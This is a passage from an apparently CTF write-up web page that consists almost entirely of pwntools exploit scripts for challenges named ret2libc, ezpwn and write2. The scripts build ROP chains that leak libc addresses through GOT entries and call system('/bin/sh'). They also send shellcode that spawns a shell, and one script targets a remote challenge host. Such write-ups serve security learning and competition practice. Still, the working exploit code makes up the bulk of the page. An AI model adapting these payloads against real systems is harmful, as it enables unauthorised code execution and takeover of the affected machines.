data-num=\"12\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'Y'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">################</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\"># s</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># 41</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\"># -01</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\"># 13 -> 12</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\"># 40</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\"># -28</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\"># 4d ->25</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\"># -1</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">################</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">payload</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\tsl<span class=\"token punctuation\">(</span><span class=\"token string\">'s'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\tsl<span class=\"token punctuation\">(</span><span class=\"token string\">'41'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\tsl<span class=\"token punctuation\">(</span><span class=\"token string\">'-1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\tsl<span class=\"token punctuation\">(</span><span class=\"token string\">'40'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\tsl<span class=\"token punctuation\">(</span><span class=\"token string\">'-28'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\tsl<span class=\"token punctuation\">(</span><span class=\"token string\">'-1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>payload<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"ret2libc\"><a class=\"markdownIt-Anchor\" href=\"#ret2libc\">#</a> ret2libc</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'pwn.node.game.sycsec.com'</span><span class=\"token punctuation\">,</span><span class=\"token number\">30680</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># r = gdb.debug('./chal')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># r = process('./chal')</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./chal'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'Y'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>rdi_ret <span class=\"token operator\">=</span><span class=\"token number\">0x0000000000401333</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>rsi_r15_ret <span class=\"token operator\">=</span><span class=\"token number\">0x0000000000401331</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x000000000040101a</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>write_got<span class=\"token operator\">=</span>elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>write_plt<span class=\"token operator\">=</span>elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'try this\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'This challenge no backdoor!'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>gadget_1 <span class=\"token operator\">=</span> <span class=\"token number\">0x40132A</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>gadget_2 <span class=\"token operator\">=</span> <span class=\"token number\">0x401310</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'\\0'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>gadget_1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># rbx</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># rbp</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># r12</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>write_got<span class=\"token punctuation\">)</span> <span class=\"token comment\"># r13</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># r14</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>write_got<span class=\"token punctuation\">)</span> <span class=\"token comment\"># r15</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>gadget_2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>payload <span class=\"token operator\">+=</span> <span class=\"token string\">b'\\0'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x8</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token operator\">*</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x04010D0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>write <span class=\"token operator\">=</span> lic<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x7f'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>write<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>libc <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">,</span>write<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>base <span class=\"token operator\">=</span> write <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>system <span class=\"token operator\">=</span> base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>binsh <span class=\"token operator\">=</span> base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>payload2 <span class=\"token operator\">=</span> <span class=\"token string\">b'\\0'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>sl<span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"ezpwn\"><a class=\"markdownIt-Anchor\" href=\"#ezpwn\">#</a> ezpwn</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># r = remote(\"pwn.node.game.sycsec.com\",31041)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># r = gdb.debug('./pwn')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># libc = ELF('/home/h711/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># ld-linux-x86-64.so.2</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #ËÆæÁΩÆÁßçÂ≠ê</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'F'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>shellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\txor rax,rax</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\tmov dx,0x100</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\tsyscall</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>'''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>paylaod <span class=\"token operator\">=</span><span class=\"token string\">b'/bin/sh\\x00'</span> <span class=\"token operator\">+</span> shellcode</pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>paylaod<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>se<span class=\"token punctuation\">(</span>paylaod<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token comment\"># gdb.attach(r)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>shellcode <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x90'</span><span class=\"token operator\">*</span><span class=\"token number\">9</span><span class=\"token operator\">+</span>asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>se<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"write2\"><a class=\"markdownIt-Anchor\" href=\"#write2\">#</a> write2</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td 